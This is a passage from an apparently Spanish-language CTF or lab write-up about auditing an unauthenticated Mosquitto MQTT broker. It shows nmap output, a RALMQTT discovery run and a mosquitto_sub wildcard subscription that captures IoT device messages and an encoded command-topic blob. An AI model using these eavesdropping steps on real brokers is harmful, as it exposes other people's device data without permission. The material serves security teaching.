+</span></span><span class=line><span class=cl><span class=o>|</span>   <span class=mi>3072</span> <span class=mi>9</span><span class=ss>c</span><span class=p>:</span><span class=ss>f5</span><span class=p>:</span><span class=mo>01</span><span class=ss>:b9</span><span class=p>:</span><span class=mo>00</span><span class=ss>:cd</span><span class=p>:</span><span class=mi>08</span><span class=p>:</span><span class=mi>26</span><span class=p>:</span><span class=mi>4</span><span class=ss>f</span><span class=p>:</span><span class=mi>93</span><span class=p>:</span><span class=mi>48</span><span class=p>:</span><span class=mi>28</span><span class=p>:</span><span class=mi>6</span><span class=ss>d</span><span class=p>:</span><span class=ss>f2</span><span class=p>:</span><span class=ss>f9</span><span class=p>:</span><span class=n>d7</span> <span class=p>(</span><span class=no>RSA</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>   <span class=mi>256</span> <span class=mi>48</span><span class=ss>:ce</span><span class=p>:</span><span class=mi>2</span><span class=ss>d</span><span class=p>:</span><span class=mo>05</span><span class=p>:</span><span class=mi>5</span><span class=ss>a</span><span class=p>:</span><span class=mi>87</span><span class=ss>:c1:ec</span><span class=p>:</span><span class=mi>84</span><span class=p>:</span><span class=mi>74</span><span class=p>:</span><span class=mi>97</span><span class=ss>:b4</span><span class=p>:</span><span class=mi>2</span><span class=ss>b</span><span class=p>:</span><span class=mi>6</span><span class=ss>b</span><span class=p>:</span><span class=ss>a8</span><span class=p>:</span><span class=n>bd</span> <span class=p>(</span><span class=no>ECDSA</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=o>|</span><span class=n>_</span>  <span class=mi>256</span> <span class=mi>24</span><span class=ss>:d7</span><span class=p>:</span><span class=mi>87</span><span class=p>:</span><span class=mi>31</span><span class=p>:</span><span class=mi>4</span><span class=ss>b</span><span class=p>:</span><span class=mi>28</span><span class=p>:</span><span class=mi>3</span><span class=ss>c</span><span class=p>:</span><span class=ss>c8</span><span class=p>:</span><span class=mi>84</span><span class=p>:</span><span class=mi>5</span><span class=ss>c</span><span class=p>:</span><span class=mi>5</span><span class=ss>e</span><span class=p>:</span><span class=ss>d8</span><span class=p>:</span><span class=mi>6</span><span class=ss>d</span><span class=p>:</span><span class=ss>fa</span><span class=p>:</span><span class=ss>c7</span><span class=p>:</span><span class=mi>42</span> <span class=p>(</span><span class=no>ED25519</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=mi>1883</span><span class=o>/</span><span class=n>tcp</span> <span class=nb>open</span>  <span class=n>mosquitto</span> <span class=n>version</span> <span class=mi>2</span><span class=o>.</span><span class=mi>0</span><span class=o>.</span><span class=mi>14</span>
+</span></span><span class=line><span class=cl><span class=o>|</span> <span class=n>mqtt</span><span class=o>-</span><span class=ss>subscribe</span><span class=p>:</span> 
+</span></span><span class=line><span class=cl><span class=o>|</span>   <span class=no>Topics</span> <span class=ow>and</span> <span class=n>their</span> <span class=n>most</span> <span class=n>recent</span> <span class=ss>payloads</span><span class=p>:</span> 
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=nb>load</span><span class=o>/</span><span class=n>messages</span><span class=o>/</span><span class=n>received</span><span class=o>/</span><span class=mi>5</span><span class=ss>min</span><span class=p>:</span> <span class=mi>87</span><span class=o>.</span><span class=mi>61</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=n>publish</span><span class=o>/</span><span class=n>bytes</span><span class=o>/</span><span class=ss>sent</span><span class=p>:</span> <span class=mi>432</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=n>publish</span><span class=o>/</span><span class=n>messages</span><span class=o>/</span><span class=ss>sent</span><span class=p>:</span> <span class=mi>56</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=n>bytes</span><span class=o>/</span><span class=ss>received</span><span class=p>:</span> <span class=mi>75711</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=n>messages</span><span class=o>/</span><span class=ss>stored</span><span class=p>:</span> <span class=mi>33</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=n>storage</span><span class=o>/</span><span class=ss>thermostat</span><span class=p>:</span> <span class=p>{</span><span class=s2>&#34;id&#34;</span><span class=p>:</span><span class=mi>16286150324772256139</span><span class=p>,</span><span class=s2>&#34;temperature&#34;</span><span class=p>:</span><span class=mi>24</span><span class=o>.</span><span class=mi>199913</span><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=nb>load</span><span class=o>/</span><span class=n>connections</span><span class=o>/</span><span class=mi>5</span><span class=ss>min</span><span class=p>:</span> <span class=mi>0</span><span class=o>.</span><span class=mi>40</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=nb>load</span><span class=o>/</span><span class=n>messages</span><span class=o>/</span><span class=n>sent</span><span class=o>/</span><span class=mi>15</span><span class=ss>min</span><span class=p>:</span> <span class=mi>64</span><span class=o>.</span><span class=mi>26</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=nb>load</span><span class=o>/</span><span class=n>messages</span><span class=o>/</span><span class=n>sent</span><span class=o>/</span><span class=mi>5</span><span class=ss>min</span><span class=p>:</span> <span class=mi>93</span><span class=o>.</span><span class=mi>11</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=nb>load</span><span class=o>/</span><span class=n>publish</span><span class=o>/</span><span class=n>sent</span><span class=o>/</span><span class=mi>1</span><span class=ss>min</span><span class=p>:</span> <span class=mi>25</span><span class=o>.</span><span class=mi>58</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=nb>load</span><span class=o>/</span><span class=n>bytes</span><span class=o>/</span><span class=n>sent</span><span class=o>/</span><span class=mi>1</span><span class=ss>min</span><span class=p>:</span> <span class=mi>1473</span><span class=o>.</span><span class=mi>09</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=nb>load</span><span class=o>/</span><span class=n>publish</span><span class=o>/</span><span class=n>sent</span><span class=o>/</span><span class=mi>5</span><span class=ss>min</span><span class=p>:</span> <span class=mi>5</span><span class=o>.</span><span class=mi>50</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=nb>load</span><span class=o>/</span><span class=n>sockets</span><span class=o>/</span><span class=mi>5</span><span class=ss>min</span><span class=p>:</span> <span class=mi>0</span><span class=o>.</span><span class=mi>40</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=nb>load</span><span class=o>/</span><span class=n>bytes</span><span class=o>/</span><span class=n>received</span><span class=o>/</span><span class=mi>5</span><span class=ss>min</span><span class=p>:</span> <span class=mi>4127</span><span class=o>.</span><span class=mi>55</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=nb>load</span><span class=o>/</span><span class=n>messages</span><span class=o>/</span><span class=n>received</span><span class=o>/</span><span class=mi>15</span><span class=ss>min</span><span class=p>:</span> <span class=mi>62</span><span class=o>.</span><span class=mi>40</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=n>patio</span><span class=o>/</span><span class=ss>lights</span><span class=p>:</span> <span class=p>{</span><span class=s2>&#34;id&#34;</span><span class=p>:</span><span class=mi>10091236782170931182</span><span class=p>,</span><span class=s2>&#34;color&#34;</span><span class=ss>:&#34;WHITE&#34;</span><span class=p>,</span><span class=s2>&#34;status&#34;</span><span class=ss>:&#34;ON&#34;</span><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=nb>load</span><span class=o>/</span><span class=n>sockets</span><span class=o>/</span><span class=mi>1</span><span class=ss>min</span><span class=p>:</span> <span class=mi>1</span><span class=o>.</span><span class=mi>83</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=n>messages</span><span class=o>/</span><span class=ss>received</span><span class=p>:</span> <span class=mi>1593</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=ss>uptime</span><span class=p>:</span> <span class=mi>1056</span> <span class=n>seconds</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=nb>load</span><span class=o>/</span><span class=n>bytes</span><span class=o>/</span><span class=n>received</span><span class=o>/</span><span class=mi>1</span><span class=ss>min</span><span class=p>:</span> <span class=mi>4244</span><span class=o>.</span><span class=mi>34</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=nb>load</span><span class=o>/</span><span class=n>sockets</span><span class=o>/</span><span class=mi>15</span><span class=ss>min</span><span class=p>:</span> <span class=mi>0</span><span class=o>.</span><span class=mi>15</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=n>livingroom</span><span class=o>/</span><span class=ss>speaker</span><span class=p>:</span> <span class=p>{</span><span class=s2>&#34;id&#34;</span><span class=p>:</span><span class=mi>15784822528549805117</span><span class=p>,</span><span class=s2>&#34;gain&#34;</span><span class=p>:</span><span class=mi>41</span><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=ss>version</span><span class=p>:</span> <span class=n>mosquitto</span> <span class=n>version</span> <span class=mi>2</span><span class=o>.</span><span class=mi>0</span><span class=o>.</span><span class=mi>14</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=n>clients</span><span class=o>/</span><span class=ss>active</span><span class=p>:</span> <span class=mi>2</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=n>store</span><span class=o>/</span><span class=n>messages</span><span class=o>/</span><span class=ss>count</span><span class=p>:</span> <span class=mi>33</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=n>publish</span><span class=o>/</span><span class=n>bytes</span><span class=o>/</span><span class=ss>received</span><span class=p>:</span> <span class=mi>54039</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=n>retained</span> <span class=n>messages</span><span class=o>/</span><span class=ss>count</span><span class=p>:</span> <span class=mi>36</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=n>subscriptions</span><span class=o>/</span><span class=ss>count</span><span class=p>:</span> <span class=mi>3</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=nb>load</span><span class=o>/</span><span class=n>connections</span><span class=o>/</span><span class=mi>1</span><span class=ss>min</span><span class=p>:</span> <span class=mi>1</span><span class=o>.</span><span class=mi>83</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=n>store</span><span class=o>/</span><span class=n>messages</span><span class=o>/</span><span class=ss>bytes</span><span class=p>:</span> <span class=mi>177</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=n>clients</span><span class=o>/</span><span class=ss>maximum</span><span class=p>:</span> <span class=mi>2</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=n>clients</span><span class=o>/</span><span class=ss>connected</span><span class=p>:</span> <span class=mi>2</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=n>bytes</span><span class=o>/</span><span class=ss>sent</span><span class=p>:</span> <span class=mi>8829</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=nb>load</span><span class=o>/</span><span class=n>messages</span><span class=o>/</span><span class=n>received</span><span class=o>/</span><span class=mi>1</span><span class=ss>min</span><span class=p>:</span> <span class=mi>91</span><span class=o>.</span><span class=mi>43</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=nb>load</span><span class=o>/</span><span class=n>messages</span><span class=o>/</span><span class=n>sent</span><span class=o>/</span><span class=mi>1</span><span class=ss>min</span><span class=p>:</span> <span class=mi>117</span><span class=o>.</span><span class=mo>01</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=nb>load</span><span class=o>/</span><span class=n>publish</span><span class=o>/</span><span class=n>sent</span><span class=o>/</span><span class=mi>15</span><span class=ss>min</span><span class=p>:</span> <span class=mi>1</span><span class=o>.</span><span class=mi>86</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=n>messages</span><span class=o>/</span><span class=ss>sent</span><span class=p>:</span> <span class=mi>1648</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=nb>load</span><span class=o>/</span><span class=n>bytes</span><span class=o>/</span><span class=n>sent</span><span class=o>/</span><span class=mi>5</span><span class=ss>min</span><span class=p>:</span> <span class=mi>588</span><span class=o>.</span><span class=mi>47</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=nb>load</span><span class=o>/</span><span class=n>bytes</span><span class=o>/</span><span class=n>sent</span><span class=o>/</span><span class=mi>15</span><span class=ss>min</span><span class=p>:</span> <span class=mi>329</span><span class=o>.</span><span class=mi>94</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=nb>load</span><span class=o>/</span><span class=n>bytes</span><span class=o>/</span><span class=n>received</span><span class=o>/</span><span class=mi>15</span><span class=ss>min</span><span class=p>:</span> <span class=mi>2955</span><span class=o>.</span><span class=mi>82</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>     <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=n>clients</span><span class=o>/</span><span class=ss>total</span><span class=p>:</span> <span class=mi>2</span>
+</span></span><span class=line><span class=cl><span class=o>|</span><span class=n>_</span>    <span class=vg>$SYS</span><span class=o>/</span><span class=n>broker</span><span class=o>/</span><span class=nb>load</span><span class=o>/</span><span class=n>connections</span><span class=o>/</span><span class=mi>15</span><span class=ss>min</span><span class=p>:</span> <span class=mi>0</span><span class=o>.</span><span class=mi>15</span>
+</span></span><span class=line><span class=cl><span class=no>Service</span> <span class=ss>Info</span><span class=p>:</span> <span class=ss>OS</span><span class=p>:</span> <span class=no>Linux</span><span class=p>;</span> <span class=ss>CPE</span><span class=p>:</span> <span class=ss>cpe</span><span class=p>:</span><span class=sr>/o:linux:linux_kernel
+</span></span></span><span class=line><span class=cl><span class=sr>
+</span></span></span><span class=line><span class=cl><span class=sr>Service detection performed. Please report any incorrect results at https:/</span><span class=o>/</span><span class=n>nmap</span><span class=o>.</span><span class=n>org</span><span class=o>/</span><span class=n>submit</span><span class=o>/</span> <span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=no>Nmap</span> <span class=ss>done</span><span class=p>:</span> <span class=mi>1</span> <span class=no>IP</span> <span class=n>address</span> <span class=p>(</span><span class=mi>1</span> <span class=n>host</span> <span class=n>up</span><span class=p>)</span> <span class=n>scanned</span> <span class=k>in</span> <span class=mi>32</span><span class=o>.</span><span class=mi>97</span> <span class=n>seconds</span></span></span></code></pre></div><p>Ahora bien, investiguemos que es ese servicio llamado <strong>Mosquitto</strong>:</p><blockquote><p>&ldquo;Mosquitto es un servidor (o bróker) de mensajes de código abierto que implementa el protocolo MQTT. Actúa como un intermediario que permite a diferentes dispositivos y aplicaciones (publicadores y suscriptores) comunicarse entre sí de manera eficiente, especialmente útil en el Internet de las Cosas (IoT) debido a la ligereza del protocolo MQTT. Mosquitto facilita la transmisión de mensajes en un modelo de publicación/suscripción (pub/sub), donde los publicadores envían mensajes a temas y los suscriptores reciben esos mensajes de los temas a los que se han suscrito.&rdquo; - Geminis AI</p></blockquote><p>Ahora bien, procedemos a hacerle una auditoría al servicio <strong>MQTT</strong>, instalamos en nuestra máquina atacante, <code>mosquito_sub</code> y <code>mosquito_pub</code>, y clonamos <a href=https://github.com/Red-Alert-Labs/ralmqtt/ class=external-link target=_blank rel=noopener>RALMQTT</a>.</p><p>Ejecutamos RALMQTT</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python ralmqtt.py -m discovery -a 10.201.64.81</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=o>--------------------------------------------------------------------------</span>
+</span></span><span class=line><span class=cl>  <span class=n>_____</span>            <span class=n>_</span>      <span class=n>__</span>  <span class=n>__</span>  <span class=n>____</span> <span class=n>_______</span> <span class=n>_______</span>
+</span></span><span class=line><span class=cl> <span class=o>|</span>  <span class=n>__</span> <span class=o>/</span>     <span class=sr>//</span>   <span class=o>|</span> <span class=o>|</span>    <span class=o>|</span>  <span class=sr>//</span>  <span class=o>|/</span> <span class=n>__</span> <span class=sr>/__   __|__   __|
+</span></span></span><span class=line><span class=cl><span class=sr> | |__) |   /</span>  <span class=o>/</span>  <span class=o>|</span> <span class=o>|</span>    <span class=o>|</span> <span class=o>/</span>  <span class=o>/</span> <span class=o>|</span> <span class=o>|</span>  <span class=o>|</span> <span class=o>|</span> <span class=o>|</span> <span class=o>|</span>     <span class=o>|</span> <span class=o>|</span>
+</span></span><span class=line><span class=cl> <span class=o>|</span>  <span class=n>_</span>  <span class=o>/</span>   <span class=o>/</span> <span class=sr>//</span> <span class=o>/</span> <span class=o>|</span> <span class=o>|</span>    <span class=o>|</span> <span class=o>|//|</span> <span class=o>|</span> <span class=o>|</span>  <span class=o>|</span> <span class=o>|</span> <span class=o>|</span> <span class=o>|</span>     <span class=o>|</span> <span class=o>|</span>
+</span></span><span class=line><span class=cl> <span class=o>|</span> <span class=o>|</span> <span class=o>/</span> <span class=o>/</span>  <span class=o>/</span> <span class=n>____</span> <span class=sr>/| |____| |  | | |__| | | |     | |
+</span></span></span><span class=line><span class=cl><span class=sr> |_|  /</span><span class=n>_</span><span class=o>//</span><span class=n>_</span><span class=o>/</span>    <span class=sr>/_/</span><span class=n>______</span><span class=o>|</span><span class=n>_</span><span class=o>|</span>  <span class=o>|</span><span class=n>_</span><span class=o>|/</span><span class=n>___</span><span class=o>/</span><span class=n>_</span><span class=o>/</span> <span class=o>|</span><span class=n>_</span><span class=o>|</span>     <span class=o>|</span><span class=n>_</span><span class=o>|</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=no>Made</span> <span class=n>by</span> <span class=n>eddym</span><span class=vi>@lou</span> <span class=sr>//</span> <span class=ss>https</span><span class=p>:</span><span class=sr>//</span><span class=n>www</span><span class=o>.</span><span class=n>redalertlabs</span><span class=o>.</span><span class=n>com</span>
+</span></span><span class=line><span class=cl><span class=no>Your</span> <span class=no>IoT</span> <span class=no>Cybersecurity</span> <span class=no>Trusted</span> <span class=no>Partner</span>
+</span></span><span class=line><span class=cl><span class=no>Bringing</span> <span class=no>Trust</span> <span class=n>to</span> <span class=n>the</span> <span class=no>Internet</span> <span class=n>of</span> <span class=no>Things</span>
+</span></span><span class=line><span class=cl><span class=no>RALMQTT</span> <span class=n>is</span> <span class=n>a</span> <span class=n>python</span> <span class=n>based</span> <span class=n>tool</span> <span class=n>designed</span> <span class=k>for</span> <span class=no>MQTT</span> <span class=n>pentesting</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>--------------------------------------------------------------------------</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=no>Broker</span> <span class=ss>Address</span><span class=p>:</span> <span class=mi>10</span><span class=o>.</span><span class=mi>201</span><span class=o>.</span><span class=mi>64</span><span class=o>.</span><span class=mi>81</span>
+</span></span><span class=line><span class=cl><span class=no>Broker</span> <span class=ss>Port</span><span class=p>:</span> <span class=mi>1883</span>
+</span></span><span class=line><span class=cl><span class=no>Broker</span> <span class=ss>Password</span><span class=p>:</span> <span class=no>None</span>
+</span></span><span class=line><span class=cl><span class=no>Broker</span> <span class=ss>User</span><span class=p>:</span> <span class=no>None</span>
+</span></span><span class=line><span class=cl><span class=no>Attack</span> <span class=ss>Mode</span><span class=p>:</span> <span class=n>discovery</span>
+</span></span><span class=line><span class=cl><span class=o>[!]</span> <span class=no>Entering</span> <span class=n>discovery</span> <span class=n>mode</span> <span class=o>[!]</span>
+</span></span><span class=line><span class=cl><span class=no>No</span> <span class=n>authentication</span> <span class=n>mechanism</span> <span class=n>is</span> <span class=n>implemented</span> <span class=ow>or</span> <span class=n>valid</span> <span class=n>credentials</span> <span class=p>:</span> <span class=n>successfully</span> <span class=n>connected</span>
+</span></span><span class=line><span class=cl><span class=no>Subscribing</span> <span class=n>to</span> <span class=n>the</span> <span class=vg>$SYS</span><span class=o>/</span><span class=c1># topic hierarchy for footprinting...</span>
+</span></span><span class=line><span class=cl><span class=no>Messages</span> <span class=n>received</span> <span class=n>on</span> <span class=vg>$SYS</span><span class=o>/</span><span class=c1># topics. The topic is accessible. </span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>-</span><span class=no>Broker_Version</span> <span class=p>:</span> <span class=n>mosquitto</span> <span class=n>version</span> <span class=mi>2</span><span class=o>.</span><span class=mi>0</span><span class=o>.</span><span class=mi>14</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>-</span><span class=no>Uptime</span> <span class=p>:</span> <span class=mi>2519</span> <span class=n>seconds</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>-</span><span class=no>Connected_clients</span> <span class=p>:</span> <span class=mi>2</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>-</span><span class=no>Received_Messages_1_Minute</span> <span class=p>:</span> <span class=mi>93</span><span class=o>.</span><span class=mi>85</span></span></span></code></pre></div><p>No tiene mecanismo de autenticación, o sea que solo debemos conectarnos al servidor y colocarnos en modo escucha en un tópico especifico, pero nos ponemos en escucha en todos los tópicos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mosquitto_sub -h 10.201.64.81 -t <span class=s1>&#39;#&#39;</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=p>{</span><span class=s2>&#34;id&#34;</span><span class=p>:</span><span class=mi>14921951914159204648</span><span class=p>,</span><span class=s2>&#34;gain&#34;</span><span class=p>:</span><span class=mi>59</span><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=n>eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ</span><span class=o>==</span>
+</span></span><span class=line><span class=cl><span class=p>{</span><span class=s2>&#34;id&#34;</span><span class=p>:</span><span class=mi>13251117175332931824</span><span class=p>,</span><span class=s2>&#34;temperature&#34;</span><span class=p>:</span><span class=mi>24</span><span class=o>.</span><span class=mi>486698</span><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>{</span><span class=s2>&#34;id&#34;</span><span class=p>:</span><span class=mi>4995570295506588961</span><span class=p>,</span><span class=s2>&#34;color&#34;</span><span class=ss>:&#34;PURPLE&#34;</span><span class=p>,</span><span class=s2>&#34;status&#34;</span><span class=ss>:&#34;OFF&#34;</span><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>{</span><span class=s2>&#34;id&#34;</span><span class=p>:</span><span class=mi>7523735876140762080</span><span class=p>,</span><span class=s2>&#34;in_use&#34;</span><span class=ss>:false</span><span class=p>,</span><span class=s2>&#34;temperature&#34;</span><span class=p>:</span><span class=mi>142</span><span class=o>.</span><span class=mi>27681</span><span class=p>,</span><span class=s2>&#34;toast_time&#34;</span><span class=p>:</span><span class=mi>263</span><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>{</span><span class=s2>&#34;id&#34;</span><span class=p>:</span><span class=mi>10752660886038971563</span><span class=p>,</span><span class=s2>&#34;yaxis&#34;</span><span class=ss>:-</span><span class=mi>55</span><span class=o>.</span><span class=mi>085274</span><span class=p>,</span><span class=s2>&#34;xaxis&#34;</span><span class=p>:</span><span class=mi>159</span><span class=o>.</span><span class=mi>61578</span><span class=p>,</span><span class=s2>&#34;zoom&#34;</span><span class=p>:</span><span class=mi>3</span><span class=o>.</span><span class=mi>7765393</span><span class=p>,</span><span class=s2>&#34;movement&#34;</span><span class=ss>:false</span><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>{</span><span class=s2>&#34;id&#34;</span><span class=p>:</span><span class=mi>6969632319201599276</span><span class=p>,</span><span class=s2>&#34;gain&#34;</span><span class=p>:</span><span class=mi>41</span><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>{</span><span class=s2>&#34;id&#34;</span><span class=p>:</span><span class=mi>14740914807410967904</span><span class=p>,</span><span class=s2>&#34;temperature&#34;</span><span class=p>:</span><span class=mi>23</span><span class=o>.</span><span class=mi>94953</span><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>{</span><span class=s2>&#34;id&#34;</span><span class=p>:</span><span class=mi>4816665109720549666</span><span class=p>,</span><span class=s2>&#34;temperature&#34;</span><span class=p>:</span><span class=mi>24</span><span class=o>.</span><span class=mi>40741</span><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>{</span><span class=s2>&#34;id&#34;</span><span class=p>:</span><span class=mi>12914864508750389800</span><span class=p>,</span><span class=s2>&#34;gain&#34;</span><span class=p>:</span><span class=mi>45</span><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>{</span><span class=s2>&#34;id&#34;</span><span class=p>:</span><span class=mi>5450592140510537249</span><span class=p>,</span><span class=s2>&#34;color&#34;</span><span class=ss>:&#34;PURPLE&#34;</span><span class=p>,</span><span class=s2>&#34;status&#34;</span><span class=ss>:&#34;ON&#34;</span><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>{</span><span class=s2>&#34;id&#34;</span><span class=p>:</span><span class=mi>7272344814928664096</span><span class=p>,</span><span class=s2>&#34;in_use&#34;</span><span class=ss>:true</span><span class=p>,</span><span class=s2>&#34;temperature&#34;</span><span class=p>:</span><span class=mi>153</span><span class=o>.</span><span class=mi>9174</span><span class=p>,</span><span class=s2>&#34;toast_time&#34;</span><span class=p>:</span><span class=mi>360</span><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>{</span><span class=s2>&#34;id&#34;</span><span class=p>:</span><span class=mi>17207880952866235814</span><span class=p>,</span><span class=s2>&#34;temperature&#34;</span><span class=p>:</span><span class=mi>23</span><span class=o>.</span><span class=mi>229897</span><span class=p>}</span>
